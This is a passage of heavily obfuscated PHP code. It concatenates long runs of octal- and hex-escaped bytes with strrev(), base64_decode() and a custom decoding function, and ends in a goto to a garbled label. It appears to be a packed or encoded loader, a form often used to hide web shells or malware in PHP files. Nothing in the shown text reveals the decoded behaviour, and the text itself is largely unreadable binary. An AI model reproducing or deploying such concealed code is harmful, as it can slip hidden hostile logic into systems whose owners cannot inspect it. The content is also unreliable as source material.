Ávpw'."\n".'Û@Õ‰©©H«"Ö‚°¡SMUÇdhÒ™xwX‘RîÍÊö£Aië£')."\162\27\205\245\4\312\325\260\146\304\331\0\263\15\365\201\120\316\123\50\107\114\223\42\111\264\141\107\243\244\247\50\311\260\61\43\353\123\270\117\0\14\304\302\7\75\231\204"."\212\130\2\255\210\46\205\227\245\22\41\14\44\334\347\136\173\242\77\204\240\140\351\310\52\151\324\154\222\360\154\201\125\160\110\260\312\305\42\122\346\21\63\211\200\101\144\313"."\223\372\304\123\310\111\1\35\146\371\34\141\61\160\335\64\326\237\210\364\205\22\313\141\310\204\14\0\53\320\54\272\314\146\105\304\260\7\44\303\355\30\152\265\154\310\115\347"."\170\35\243\260\110\236\135\7\24\26\265\6\26\0\236\171\32\4\117\176\52\267\313\145\207\50\115\200\307\15\76\26\140\376\21\210\65\20\73\206\52\41\222\303\143\142\326\0"."\367\141\126\344\124\331\236\111\270\32\304\233\44\236\144\130\0\341\236\320\100\124\206\300\120\51\213\303\313\277\144\215\260\226\326\133\43\54\215\35\307\360\325\6\375\151\232\5".strrev('øÛ÷85@¤òİÉ+Ú•añ‡51„Hÿh«Š4,h«AÌ¾FÛ-ZLÚš.£ı')."\45\135\143\171\352\165\215\227\347\47\117\341\330\242\110\54\334\321\67\21\111\206\372\24\326\160\70\133\303\356\315\346\102\75\221\270\32\105\74\261\52\37\237\105\342\160\56\33".base64_decode('SMv+OlTh9iOgCW1mx6pK7vUMk2gV93FzA6LqjBAiJMz9+dkxSaumcWl5u4LyHhd1').strrev('vîÊ^nL¾Â³2’²××2@`UÉZÈX¦ó8hX2Åj½Ç×UÙÌ¥ÊfpSÙ†')."\242\215\263\250\142\317\31\110\56\124\165\321\255\222\156\333\374\376\225\110\101\54\350\24\204\333\2\331\125\140\167\47\33\302\152\331\111\352\105\270\247\357\116\23\335\160\141\355"."\x25\xec\x64\x24\x9d\x71\x72\x99\x21\xe6\x85\x3a\x6d\xf4\x14\x84\x9a\x22\xbc\xe3\x52\x2e\x1\x8c\xa\xdf\x80\xf8\x1e\x41\xd4\xb9\x92\xc9\xf2\xa2\x93\x6b\x8c\x8a\xf7\xe2\xa0\x6c\xf6\xeb\x56\xc9"."\40\27\44\113\205\101\12\117\227\112\23\313\42\146\267\125\167\160\253\145\364\205\176\76\263\376\126\226\231\71\173\45\170\244\160\101\226\133\131\240\51\45\145\45\65\174\302\114"."\101\265\26\134\125\36\341\151\234\143\232\175\132\171\42\145\56\61\164\300\336\356\370\322\130\64\316\134\232\61\177\210\64\226\7\115\37\304\271\130\1\26\161\130\300\142\152\111".strrev('ŒQøÙÌ} ’i¤&´ÔT^‚¢dm½ ‰í]Q"õtJ8É2ïƒÉ¹{K')."\x9a\x79\xbe\xc8\x11\x2b\x7\xbe\xac\x5c\xb\x3d\x12\x87\xb2\x1\x1d\x1b\xd4\x50\xa3\x6\x6c\xf4\xc4\xb\x52\x77\x4e\x5f\x5d\x68\x40\x72\x25\x39\xc9\xda\xac\x5b\xae\xb\x32\xf2\xf\x5a\xe4\xdc".base64_decode('5as/mNDF9omKEfulrywkaBX5Eikk0TdPGYJA1PoC5roAycI7DyKqsbjai+h2nO3u').base64_decode('hp1y0UlWClarg5iPTJBYjILsNI/cjNP7OZDH1iISyENMIwF8R4ldNUR/lpeyftRw')."\320\157\310\352\16\367\331\203\127\31\63\236\303\155\226\354\155\113\234\100\215\111\336\361\264\121\35\233\53\261\223\211\32\305\20\350\112\155\347\270\223\46\367\205\74\276\121\112"."\306\7\22\354\332\3\307\211\41\146\42\334\265\234\337\100\160\150\117\150\211\27\202\327\100\52\264\250\56\230\37\42\141\70\221\326\324\104\34\237\266\205\243\75\236\2\311\136".strrev('ug¤'."\n".'™Á#µâG%%Ş4gxŠıxÃ$5ÜÂóî$`PŠ“ïÏh	ºâØ‘£S'."\r".'ĞÜî').base64_decode('GDyhaWgtETfakdSRXYeFer+6cnrzwqH1zU1DwYWBafwsitITyWRzErDN6H67F4C3')."\xc\x6\xa4\xc5\x20\x16\xc\x4\xe0\x23\x3c\x10\x1c\xa\x72\x47\x51\x8c\x8c\x82\xc7\xd9\x24\x75\xa9\xe3\x6a\x85\xc7\xe3\x4\x33\xe5\xe\x78\x9d\x29\x46\xe8\xd5\xa4\x9a\x5c\x9e\xe4\xa3\x4d\x51"."\xb1\x5e\xba\xb\xbf\x68\x36\xf9\x7a\xdf\x93\x19\xfd\xed\x97\xb3\x62\x8d\x92\xba\x19\x5d\x8\xea\x32\x7c\x95\x41\x1\xc3\x14\x6b\x41\x2c\xda\xac\x99\xa9\x62\xaf\x3d\x62\xc4\xc5\x36\x83\x40\x1"."\127\25\210\134\17\13\151\30\326\134\222\255\315\62\332\166\140\107\354\102\314\335\242\336\310\161\213\243\175\261\170\377\361\211\144\152\140\311\322\145\313\127\300\350\62\24\310\51".base64_decode('fuZ0C9w0Bkc1KzjK3Asvwby5bgdlnocDUR8RuWPEKkhFdp6KaUOwfhKtLVgqO62T')."\xe4\xe8\xb7\xf4\xb4\x69\x3a\x93\xa4\x2e\xe9\xfb\xf2\x8a\x21\x71\x70\xc8\x5e\xc9\x70\x2e\x98\xd5\x47\x21\x28\x54\xb8\x6c\x21\x91\xc0\x7e\xed\x97\xdd\x1c\x63\xf4\x94\x19\xaf\x6c\xda\xb3\xf9\x2"."\x40\xf8\xa3\x97\xb6\x68\x1\x6c\x63\xba\x73\xcb\xfd\x25\x7f\x76\x28\xb5\x8\xfb\x62\x1c\x5a\xc1\xe7\xda\xb0\x24\x9f\x88\x19\xb3\x9c\x35\x24\xdb\x7b\x2d\xc3\x78\xac\x6a\x66\x98\x1b\xba\x63\xea".base64_decode('b/vHDIZNR3ExDVSIVC1DxVZJfW7Ej6UWv1bMm4jfKpQYVBt2pQs3mxWzaDA3aSN+')."\364\11\51\215\146\106\225\263\75\24\253\24\160\27\245\70\142\363\230\274\304\310\56\303\65\135\360\136\326\353\131\321\34\310\35\250\46\111\47\332\225\231\340\145\270\7\61\276".strrev('˜¸Èš×0Òª'."\r".'.1ó'."\r".'‘œ·Z>#¯ŸY¬vr„Sê4ºÇ:ÌKä*óó"A’')."\xcc\x7\xf4\x48\xaa\x57\x82\xff\x0\x57\xe1\x28\xad\x73\x82\xe9\x2f\x81\x51\x63\xe7\x44\x42\x7a\x87\xc1\xe5\x21\x41\x76\xae\x1e\x5a\x9a\x9c\xe9\xef\xed\xb\x75\xf9\xd1\x96\xd2\x36\xb\xf4\x6b".base64_decode('0cY+lEI7O0MsbcyeyeQNCpk+WymgmQCMqXVXepTbdS8FUjecGUvPYm0SxklSqAeT')."\50\120\320\11\32\247\356\335\230\276\125\101\343\15\306\335\240\241\172\337\135\126\367\273\313\352\175\167\231\347\273\313\152\277\113\101\36\214\325\52\225\256\2\306\5\27\65\165"."\201\62\162\204\355\144\71\254\73\43\353\334\300\11\50\125\244\15\240\344\156\312\124\147\171\176\133\204\370\252\310\111\353\305\125\135\0\110\76\24\17\342\313\177\32\54\152\266"."\xb3\xc4\xe5\xab\xe7\x2b\x9d\xe6\x62\x2f\x13\x7d\x5c\xc\xb2\x18\x2a\x7\x4d\xdb\xe\x62\xcf\x82\x84\x63\xe7\x1a\x63\xf1\x24\xbb\xe3\x71\xf7\x89\xbe\x1e\x22\x9\xe3\xe0\xe2\x8c\x7b\x7c\xe5\xfe"."\x60\x85\xd3\x58\x7a\x34\x4f\xc3\x61\xee\x6a\x5\x9\x1e\xa1\x3c\x76\x9e\x81\xe8\x1c\x8c\x4a\x78\xbc\x62\xda\xba\xec\x8d\x38\xab\x13\x4f\x97\xdc\x5a\x5c\x72\xed\x5b\xd2\xc6\x31\x25\x62\x8a\x74"."\x92\x93\x5f\xe6\x32\x57\x76\x33\x88\x7\xcc\x5f\x72\x39\x25\x1f\xf7\xa3\xae\x7b\xdc\xe4\xda\xba\x3e\xcc\x4\x4c\x49\x8\xe1\x87\x2\xfd\xdc\xfd\xad\xb7\x3b\x98\x14\x8\xa2\x68\x71\xd7\xc7\xf4"."\126\327\137\27\340\227\374\57\120\152\40\271\317\106\355\202\252\161\63\141\375\26\310\330\260\203\4\372\263\242\136\257\375\226\360\107\214\346\222\72\275\137\254\117\60\137\277\236"."\25\340\161\17\74\264\150\250\157\50\45\17\223\143\151\271\34\152\266\344\170\324\325\26\341\215\30\320\217\370\251\147\203\61\271\57\143\270\274\70\272\256\53\144\110\44\122\107"."\20\345\300\326\366\143\52\307\134\362\340\105\35\334\75\36\303\1\173\163\102\3\265\122\225\336\134\221\361\5\157\343\334\301\15\76\124\240\36\244\31\311\40\236\235\301\163\174"."\7\353\21\32\272\162\247\231\205\75\161\155\3\302\304\206\366\206\243\232\320\157\163\203\257\1\63\247\44\216\147\21\3\110\73\32\332\217\152\42\201\146\160\203\262\6\314\13"."\44\37\253\342\306\34\216\23\26\242\241\225\256\171\26\222\321\300\153\277\55\330\26\34\3\172\260\160\4\177\121\74\377\340\335\3\306\125\104\366\330\365\205\52\23\137\40\353"."\x30\xea\x72\x4a\x2f\x6f\x9\x23\xcb\x7d\xdd\x50\xfd\x32\x7f\xa8\x6f\x85\x5f\x78\x3d\x9e\xbf\x70\xbc\x54\x54\x40\xd2\xec\x68\x6c\xd\xb4\x34\x2a\xec\x79\x90\x8e\xc6\x81\x54\x8f\x7f\x6e\xe3\xc2".base64_decode('BXvN7yKXvo7eh29tsStpegCwAC5l5uPlxSNBd2yysoB/JW2NWUZbHaJQpUAGBnOA').base64_decode('UzHhiLqsO2OmBTfaQGDbWmbKOA0owoyiqO+UdnyOybo/UJmolv34GMKflP3ieXze')."\267\270\363\343\203\4\167\176\231\64\146\4\371\50\211\40\175\277\240\135\221\37\265\220\334\374\372\61\117\100\127\45\73\323\2\30\246\232\14\144\310\116\223\31\136\143\222\250"."\xba\x49\xe2\xb1\x9e\xf6\xe2\xa1\xf6\x23\xa6\xb\xe3\x3f\x5a\x54\x68\xfb\x75\xf4\x7a\x59\xdc\x2f\x27\x78\xdf\x53\xf0\x8e\x2\x29\x82\x27\xd7\x2f\x3f\xd4\x30\x8e\x38\x6e\x9c\x8c\x5d\xb6\xfb\xf1"."\xfc\xfa\x8d\xec\x64\x29\x62\x51\xd7\x6d\x6a\x6\x50\xa5\x5e\x96\x81\xaa\x91\xf5\x7e\x92\x28\x11\xf8\xab\x55\xf6\xc1\xba\x95\xca\xf2\x0\xcb\x40\x3a\x11\xe1\xf5\xb9\x38\x73\xd\xcd\x35\x67\xc6".base64_decode('vcy9dG5c6w0dLV6lbUb7rGPQ/xRyNNOBqFaY0jIKMm/pRwRzjA6IpxRY3/CES37l')."\x5d\x60\x31\x8c\x7c\x85\x33\x2\xe2\xca\x27\x5a\xeb\x7a\xa4\x3\x3a\x4a\x65\x76\xc9\xff\x3d\x39\xe0\xa6\x2b\x9\x6b\x6\xa9\xfc\xbd\x80\x3a\x94\x14\x9\x63\x80\xa2\x65\xd8\x76\xa5\x47\xbd\xf8"."\204\344\131\300\342\371\65\261\104\322\305\141\321\223\64\326\317\6\14\37\106\15\65\5\233\105\266\134\351\64\71\123\250\226\207\73\244\104\305\61\115\245\244\225\47\100\32\230"."\152\267\117\265\347\341\17\165\114\15\314\314\331\50\102\23\204\253\130\274\217\10\307\176\324\321\14\244\320\343\374\0\176\334\43\200\67\251\104\325\365\142\132\222\67\231\36\356"."\321\160\177\261\312\37\151\250\220\60\264\276\77\72\260\50\22\223\224\233\44\200\332\325\35\123\103\375\375\165\23\344\157\4\261\146\100\140\65\273\60\311\60\214\233\157\224\362".base64_decode('SgYbNHQ0YGiDYlsZ5ky3IQg0lmQQstV8A4o04iJKDqGQn4RocuOC+UFjAZ8I4fLH').base64_decode('MoW9RiB4JJa0glh9qHw0nnlZm4FAe4SDH0WZryl0jDsasW5HrlEpoL2a604u8BaO').base64_decode('sSul+UFNTsSrLmEy1pgLWKP8EL/u7URIcrpNHl3o0spLaovgygMZOYnOJLEoqc0f').strrev('Ä·„9u±To©#€˜õÁ4/‹¡!7À5±6Æ0Ì´‘çˆ¤G'."\r".'øk¯ºK!A§$').base64_decode('Uydr19KKMDewfn0tDDRAvUmhiuEFYczxwrA4LmBoj3N/hmKtnElAWB76K8pEY4tE')."\204\212\53\256\304\101\246\154\115\142\103\203\215\201\151\353\327\7\15\246\47\305\164\72\130\331\0\317\115\343\103\1\167\176\324\23\30\172\236\21\0\336\234\224\267\74\16\26".strrev(')G zS’9`˜®Áå-Oà¦¿ÓeÎ´hƒÒÉYó¿ Ác£ªIX)CëŒ"ÂiÁ^ß')."\41\267\333\335\205\243\374\21\17\231\2\321\160\250\122\221\243\354\145\32\162\377\120\64\322\101\276\332\351\235\104\40\43\14\251\130\26\102\153\74\160\254\314\344\111\300\217\101"."\22\360\50\42\224\210\43\133\355\205\243\272\70\220\7\346\333\31\313\250\70\56\72\105\337\355\153\40\217\254\254\326\106\65\232\245\101\1\331\275\243\201\370\232\157\100\164\211"."\246\0\101\20\115\231\217\11\220\142\351\305\216\6\322\134\273\240\353\250\74\41\61\365\76\202\12\66\50\214\72\226\64\76\142\226\143\242\115\221\233\364\300\223\107\3\11\60"."\x93\x8\xc5\xe0\xce\x7\xd8\xad\x23\x4f\xa0\xbf\x47\x1d\xc9\x10\x85\xbc\xbf\x55\xd4\x2d\xaa\xb\x4e\xa8\xe\xb9\x5\xcc\x89\xf3\x2e\x78\x81\xa9\x3f\x11\x4f\xc5\xbb\xd8\x83\x35\xf5\xe\xc6\x66"."\x32\xde\xd6\xa6\x36\x68\x42\x6\x62\x16\x3d\x5c\x65\x82\xe5\xe0\xdc\x42\x10\x20\x30\xfd\x56\xb5\x5c\xe6\xda\x67\x98\x7d\xe4\x5b\x1a\xd6\x66\x51\x8f\x4b\xc6\x63\xec\x9d\x8f\x14\xc7\x1e\xfc\x5e"."\x67\x40\x19\xd4\xd8\x25\x15\xa8\xad\xd2\x5b\xb7\x64\xa1\xea\x88\xed\x13\x3b\xaf\x4f\x61\x3\x5c\x1b\xc0\x92\xc3\x3e\xec\x2e\x10\x55\x34\x48\xcf\x31\x3b\x5a\x98\xe1\x6\x53\x6a\x13\x66\x5b\x90".strrev('á9iÿ“´´´²ˆ¹®v-¿?ôV–ş---m†2h»~„xë²ôÆ•Å8ŒôN³')."\x85\x49\x71\xa7\x20\x1a\xc0\x88\x17\x64\x18\xd3\x75\x68\x10\xec\xc\x25\xa3\x5c\x65\x1c\xd7\x60\x17\x36\xce\x52\x70\xd3\xa0\xcb\x42\xe9\xd\xcd\x7\x71\x2d\xc8\xe8\xc8\x3c\x49\x4e\x9c\xa7\x90"."\xdb\x48\x88\xe9\xde\x41\xe0\xd7\xbc\x30\xc3\xb2\x6f\x6a\x16\x46\x8c\xf\x9a\x6d\x32\x28\xd0\x5e\x6e\xc1\x87\xb2\x9\x3c\x9a\x47\xd\x26\x3b\x78\xa3\xc2\xe5\xec\xa0\xfc\xb1\x0\x1b\x5c\xa\x14"."\376\224\375\54\301\57\277\174\0\205\350\16\41\356\70\134\115\103\145\334\76\13\61\4\355\324\31\336\117\14\220\216\123\60\27\47\371\141\304\121\371\52\203\44\163\203\71\22".strrev('%1Ú–FW#Q’³'."\r".'SË†F<qèã±TÇ0Zè:ÃZ)ôèšñ|‹r+')."\320\171\40\106\352\303\106\321\145\232\253\112\165\313\243\71\17\147\224\107\11\55\332\20\177\111\204\152\36\262\317\53\260\272\150\224\70\120\46\257\277\121\145\321\366\275\152\346"._kodDe('Mt27CbryhQC3oXLmIRgqORIn8jsdcWr6NnBvbAWdFl1gcRvxPhDKhTsp/JtU7BXG3A==')."\xdc\xe4\x72\xa2\x4e\x6e\xc\xf7\xe4\x26\xfe\x9\xbb\xb8\x93\x55\xd9\x69\x21\xd5\x1e\x90\x74\x4c\x6c\x70\x24\x2f\xd4\x5\x58\x1d\xa3\x92\x34\x15\xa8\x58\x66\x1e\x4d\xb3\x2d\xf\x1a\x82\xf7\xd7"."\x7\xf3\xec\xb5\x39\xeb\x64\xe2\xad\x97\xf3\xc9\x40\x7c\xf3\xc1\xde\x60\x4\x8c\x15\xc6\xbd\x9a\x78\x2\x56\xca\x2a\x84\x1b\x9\xe8\x5e\xb0\x52\x42\x17\x7f\xf0\x47\x6\x62\xe9\x4c\x56\x10\x21".strrev('¨Âœ7a»‰ğQôÊ¸a4.ªø"”|MšDe:÷İq1Ò	}–ğ†çØ°:î¸*')."\100\355\272\116\112\21\132\126\324\331\363\241\24\112\27\25\256\200\350\355\170\6\125\54\4\130\272\35\35\162\61\167\332\233\147\376\220\5\56\142\271\360\260\362\363\100\371\240"."\34\17\251\52\237\165\340\25\335\313\137\255\254\203\210\156\144\253\301\52\302\2\340\12\240\65\150\65\113\61\44\314\61\176\57\313\332\73\122\325\31\217\52\221\106\305\21\204"."\21\310\130\252\140\231\16\227\137\160\172\50\53\221\373\250\314\241\244\150\21\377\2\361\35\327\275\232\344\53\231\147\105\133\31\373\272\306\266\67\242\44\106\174\115\113\42\225"."\47\352\125\44\43\133\221\303\166\23\346\174\272\314\237\220\302\323\231\224\364\170\352\174\1\12\361\42\260\107\132\172\306\264\210\154\55\171\42\50\73\11\75\57\107\243\46\77"."\123\300\367\70\172\235\52\260\363\27\11\355\61\26\40\151\267\52\273\222\221\174\124\243\230\344\214\134\342\165\374\255\12\147\222\124\132\63\215\114\227\22\110\376\172\374\222\347"."\324\113\262\150\40\302\174\262\232\346\227\17\36\56\206\31\111\50\62\223\300\254\36\160\5\304\253\7\356\201\55\247\241\152\261\37\131\321\63\271\10\371\146\115\21\232\206\367"."\151\341\33\103\116\261\261\227\361\1\66\155\365\122\352\174\212\44\111\43\232\341\36\202\140\164\304\40\101\302\204\316\164\5\375\255\155\376\31\160\266\55\133\120\60\106\231\306"."\x30\xb7\x2e\xa1\x1\x96\x29\x18\x6d\x4\xc5\x3f\xc8\x27\xf2\x98\xd2\x15\xe\xf1\x97\x21\xfc\x9\x10\xd7\x20\x7c\x3e\x89\xf\x11\x1e\xb3\xa4\xbd\x4c\xe7\x4a\x81\xc4\x99\x86\x4c\x56\xc4\x4d\x3b"."\325\25\304\31\6\352\245\323\21\302\311\335\56\125\112\117\6\264\62\334\351\340\170\134\64\206\372\363\60\135\372\70\236\112\300\251\275\354\120\235\224\22\375\20\132\251\10\144"."\122\367\346\322\300\10\215\1\352\146\204\251\323\162\272\44\300\51\223\3\153\265\16\2\134\235\30\154\113\341\75\310\246\146\154\133\352\72\301\351\233\340\26\200\130\47\10\157"."\22\134\247\323\226\43\54\225\43\247\355\212\120\35\50\127\151\16\342\271\306\364\64\15\360\223\206\376\336\376\40\7\165\362\345\111\245\123\341\335\250\213\51\32\211\327\313\307"._kodDe('KTs/fjsMu686xjc946ZnzIc6EjydPIXR/o5AoRF2xk1c25Lm88VmO5SgEcA0bA6lUA==').strrev('Ó­P*X´\\~y:üÚô±\\ÊLôâ‹¹:ÂãàÊk[cSUºŠZ»‘ô˜&’è')."\310\137\377\13\344\21\3\71\67\332\210\365\362\144\215\67\312\243\206\155\210\205\317\112\114\310\265\207\272\373\42\61\65\24\215\42\361\136\326\230\23\7\245\26\177\62\42\53"."\277\60\41\315\214\230\4\372\365\132\247\133\340\262\110\166\364\355\221\324\351\364\311\316\327\52\354\112\0\36\323\343\16\347\151\124\172\56\246\142\151\206\255\113\0\372\212\311"."\64\60\266\320\212\105\327\103\161\305\234\24\255\272\167\326\272\237\122\351\7\30\114\362\357\126\57\103\2\77\372\375\77\156\252\221\25\176\226\214\54\323\114\340\266\161\324\27"."\175\227\374\234\40\373\146\315\223\70\137\371\270\216\117\134\242\250\304\147\15\173\343\313\44\354\70\360\212\24\26\211\253\344\110\121\25\237\100\202\242\65\121\221\157\261\202\131"."\xf6\x62\x8\x93\x54\xb1\x3b\xb9\x30\x3b\xb2\xc6\x11\xc1\x18\xe3\xec\x50\x1b\xfe\x1c\x15\x97\x90\x14\x88\xcf\x75\x18\xb\xcd\x34\x20\x11\x9d\x80\x71\x76\xdd\xe2\x7a\x9e\x9\xf2\x2a\x88\xba\x9e"."\342\256\371\6\361\110\117\323\6\161\167\120\316\225\242\163\50\306\337\227\20\105\275\51\165\32\200\222\25\161\154\302\63\50\35\112\13\175\261\212\277\30\240\314\147\226\276\342".base64_decode('A8QBVLhUcVyiZK+sGS7NDQUQTkeICli/xixN1ABcZyVR1i6ukIffSyjnTHn8CEHG')."\152\376\364\335\71\52\263\372\20\257\257\73\265\317\316\320\342\377\47\5\151\142\122\122\123\164\127\122\333\40\333\273\325\11\266\13\277\250\123\60\307\334\217\317\141\210\367\15"."\35\327\353\71\322\242\41\6\251\362\173\77\356\102\276\232\167\53\24\362\236\250\202\120\35\146\21\173\61\142\62\21\311\54\175\172\52\375\31\202\137\266\235\171\33\101\11\25".strrev('w±IâÛ÷73°–W½FTş]Ğ\\SÉSw±¡3¬)ITº}'."\0".'"0®-f(ÁWU#™²|')."\272\37\235\340\327\236\266\130\14\266\343\172\324\44\145\246\264\274\217\162\144\230\252\211\130\347\204\34\226\225\104\111\57\120\42\73\114\312\362\371\136\40\145\140\157\231\145\175"."\xe4\xa1\x2d\x4a\xea\xbc\x6f\x71\x48\x2b\x8d\xd3\x4f\xb9\x74\xbe\x68\xa6\xb5\x62\x82\xea\x59\xb9\x8c\x42\x2c\x24\x4d\x71\xdd\x49\x57\x36\xa\xa\x6a\x95\x8a\xb8\x7a\x91\xb7\x4c\xf4\xaf\xcb\x70".base64_decode('DtIGUr0qMf9W6V1tUuCcdGlDgXCBUy1H6EG3C2pJcp6s4EuvqoSFFmRH7eynd1Mw').base64_decode('YHKV7L6Qn7r2SO9rB2vvF7EGGVAUWcESrnoDsiAGGZT5ikAN10LGqIS4YR8JEEoh').strrev('Ô7ñóUßI°¼LöšÒşö2©÷Î„+>Ë›±qÁŠ\\sÖéù:¢…ç~ìå_î3').base64_decode('fNRnoA9eTvMJS7sveypGPJvrfmsXt5lrJNaIE15Jgg+Vp0DCO3Aps/bMUdyqlqsl').base64_decode('cU+NIm7JqqbDUg+rVtFH7pR9zJObZzhEr+SZqTOGX10HVUwl4lLWTa/a56ctdi/n')."\xcd\x66\xb8\xb0\x4e\xb5\x74\x61\x71\x42\x3d\x58\xd6\x90\xf6\xe5\xa5\x6c\xdb\x8c\x59\xc7\xc8\xc7\x12\x62\x7e\xc4\xed\x15\x98\xbc\xc3\x6d\x1b\xf0\x19\x62\xc6\x95\x75\x2e\x7c\x52\x98\xdb\x4c\x79"."\xdd\x92\x44\xb7\xce\x70\xed\x13\x87\x1e\xda\xfd\x3f\xc3\x7c\xc1\xf7\xd3\xac\x92\x6\x6f\xed\x53\xb1\x35\x23\x40\x90\x50\xd2\x6d\x91\xb6\x32\x8f\xb2\x82\x89\x75\x8\x6c\xb1\x7c\xe8\xe6\x25\x1e"."\x36\x74\x7f\x8b\x6e\xfc\x75\xfa\x21\x3e\x2b\xad\x4\xfa\xee\x9c\x59\xc4\xd2\x71\x9\x9f\xfa\x3a\x96\xe6\x16\x5\xeb\x49\x3c\x64\x24\x98\x78\x65\x90\xe7\x9f\x75\x6f\xdb\xc9\xc0\xc0\x39\x88\x48".base64_decode('lkQiuUbH9B7i4OJ4RyNniPFyETZcbEEs1pREUv4HE8ikGyoICVWVOj0PHsvoRp13')."\x5\xa5\xfb\xfe\x2f\x69\x37\xe5\xcb\xb8\x24\xe7\xd7\x1c\xbf\x84\x90\xd2\xc1\x9f\xee\xc4\xc9\x4\xd3\xa8\x24\x70\xba\xfb\xea\xa9\x1e\x15\x13\x75\xac\xf4\x29\x93\x65\xaa\x65\xce\xa4\xe7\x7\x85"."\x8f\x29\x89\x2d\xc3\xa5\x99\xa9\xe2\x24\xf2\x3a\x23\x4e\xf2\xc3\x8a\x4e\x41\x8\x1e\x74\x85\xba\x56\xab\xe4\x8c\x56\xb6\xdd\x22\x15\xc9\xcb\xa0\xb6\x6a\xe9\x9d\x39\x71\x84\x43\xce\x7c\xa0\x13".base64_decode('sIaJ60xisxdaxO34NEm9yH2uhEdXelrUlMNi1DE9jzNnoOjrLrkQxbs9z84SquR9')."\213\226\15\21\41\5\202\312\111\346\241\56\41\204\277\305\345\22\112\154\357\163\173\210\65\223\335\364\242\50\137\4\260\235\2\71\44\72\336\364\153\322\156\311\32\225\227\102"."\223\275\77\357\176\234\336\145\105\213\175\45\171\126\76\263\315\265\75\217\157\122\127\253\64\314\330\364\377\353\367\345\376\137\75\53\67\253\205\35\233\273\36\257\135\4\314\62"."\264\26\337\215\361\303\3\172\144\353\351\207\173\323\334\23\260\210\277\323\54\305\271\42\53\363\227\305\334\150\151\354\232\107\53\26\245\255\265\276\170\121\363\352\47\102\276\141".base64_decode('/mRkvYjXYMz7Augge0ubPO65sl5GQXm4FFMHjymIMa/l2ptOPF9Rt4tjicmoySa+')."\212\170\21\346\172\54\310\102\31\54\260\141\116\224\221\131\331\122\64\136\141\242\135\63\120\366\225\360\13\266\347\100\225\144\112\344\2\325\320\257\224\153\26\134\100\171\200\141"."\326\260\161\255\373\345\165\50\321\347\171\301\220\146\142\236\25\153\137\104\47\272\346\56\7\340\152\245\352\170\234\50\121\121\105\256\103\276\51\257\375\34\47\25\162\21\254\142"."\354\76\240\342\317\134\267\170\337\275\156\365\327\176\214\152\370\343\63\222\4\76\225\140\347\114\344\302\206\134\250\326\51\103\121\73\51\362\114\262\270\352\57\161\376\324\244\30"."\x20\x1c\x92\xfb\xcb\x48\x45\xbf\x65\x92\xb1\x73\x43\xf9\x49\x8d\xa4\xc1\x29\x3d\xc4\x3c\x35\x20\xb7\x58\xa2\xc4\x9e\xb\x10\x24\x96\x89\x1b\x41\xc3\x24\x8e\xd1\x59\xd1\x81\xbe\x26\x62\xac\x2".base64_decode('zZOeNcarTjhCxEfnPSZHI+zFihwOrpO2eWY/JqlfA8h1hGfLb1C4S2KFevfiW1Av')."\133\306\264\154\51\33\207\327\313\213\61\114\76\242\220\323\360\213\264\216\153\56\204\217\173\257\157\173\42\270\123\131\334\45\222\303\245\255\14\222\356\64\21\167\236\165\77\226".base64_decode('QRIJmLnQhBqkWzn3pSj3/V1DWqtGVEompZhnNvSLbewiwpkDSab3DSHpsWNvKfcj')."\331\322\25\152\206\140\136\270\366\226\114\134\336\111\214\11\53\206\105\47\261\147\170\340\365\236\171\316\151\243\202\253\22\314\173\66\313\237\140\167\145\315\62\361\205\103\21\104"."\274\326\216\271\62\311\154\127\150\174\353\143\336\167\157\3\262\251\257\53\143\55\124\230\365\112\345\305\175\211\350\46\206\325\353\76\131\116\356\342\262\331\60\107\52\1\242\317"."\x1d\x70\x85\x23\x49\x50\xc2\x56\xd\x42\x13\x89\x76\x85\x4b\xfd\xe2\x93\x6e\x23\x65\x9e\x8d\xcf\x19\xca\x43\x6c\x48\xfc\x2e\xa8\x47\xf4\xc3\x67\x28\x8c\xc5\xf0\x24\xd9\xf2\xeb\xf2\xee\x9b\x51".base64_decode('+RhCQgG9GJWqk29NJy2QrP8RgZXuIZasu0UC2xvlWlwkkncMcibkRFdzvFNLpBaB')."\276\24\130\42\47\266\64\55\344\116\242\371\165\117\353\345\2\336\236\321\22\366\230\341\144\12\222\50\125\233\130\13\267\152\6\25\76\124\277\275\336\126\261\61\365\12\230\242"."\222\232\366\110\252\27\51\263\116\31\332\242\272\305\150\22\56\51\370\133\127\331\111\206\0\227\245\111\270\154\115\62\53\54\235\307\110\345\34\255\152\117\322\275\332\301\203\103"."\x8a\x6c\x9d\xe\x7b\x44\x79\x9a\x75\xb2\xf1\xac\x9b\xb9\xf6\x73\x80\x71\xde\xdc\xe4\x54\xa3\x7e\x2b\xc4\x61\x84\xe7\xa\xbc\x5e\x2b\xea\x66\x9e\xb4\x15\x22\xb7\x67\x17\xa8\x47\x6b\x59\x4a\x1d"."\352\52\164\41\152\351\270\110\253\243\231\101\353\304\173\264\354\355\251\116\262\254\346\121\137\21\44\121\167\351\333\156\15\15\17\134\36\30\160\354\111\43\114\165\13\211\226\105".base64_decode('Y1gorTEd66ku+l4tD5dNvmdkhYId1gYOWd6BrKnNjaflquQrta7Ktw8fBNSK3EWN').base64_decode('HfJLuvJURjIdI6O7HbLKTp9oOvtIUTpM9JzjiWMJlwZBnZMuAqLBgDgvp/WJvkg4').strrev('ŸG7ˆ3ÏOqtÓ·ä+2–œ>9i¤äÒ¯ºQ3ˆ/ÍÍ|.ÇëĞ!Ü| Q²á').strrev('i³I'."\0".'l®z©í¸>÷‘kàŠä¢¦IØ"á…ä%´_\\Š7	–âB‚m¤')."\163\234\271\152\304\166\321\242\75\370\46\103\32\62\301\237\0\372\311\372\62\304\342\334\16\322\224\40\270\370\367\153\230\121\204\47\270\2\253\53\171\127\161\372\220\21\327\1".base64_decode('/bIa4NhVVEH9e5PDMTAmSaaSNUn9oWRyaTzRTd2B1ySTUpL+UU1Sf288NllauC8U')."\x89\xd6\xa4\x61\x55\xa5\x98\x2a\xfc\x72\xd1\xa4\x48\x3f\x69\x25\xb9\xef\x9b\xac\x15\x91\xae\xc5\xa2\x25\xe4\x66\x59\x9c\xe6\x57\xa\x26\x3b\xa4\x67\xb7\x1d\x49\xad\xc8\xc4\x7a\xc9\x54\x52\x2f"."\11\7\155\242\114\331\310\14\213\323\100\115\142\336\155\346\273\220\7\334\157\353\170\64\2\31\222\102\105\130\315\50\6\165\47\52\0\305\356\321\371\132\347\214\264\270\52\17"."\270\256\324\45\70\131\17\204\300\110\70\47\157\264\4\60\255\356\0\311\47\301\265\67\23\44\125\14\0\156\330\161\146\232\106\126\233\151\351\346\201\212\61\140\256\10\103\52".strrev(''."\0".''."\0".'©Îo2Óî`âñ^ñé–ouòÑÙ+°Ñ’©')."".base64_decode('').base64_decode('').base64_decode(''), 10, -8))); goto a†§Æ“³å†; 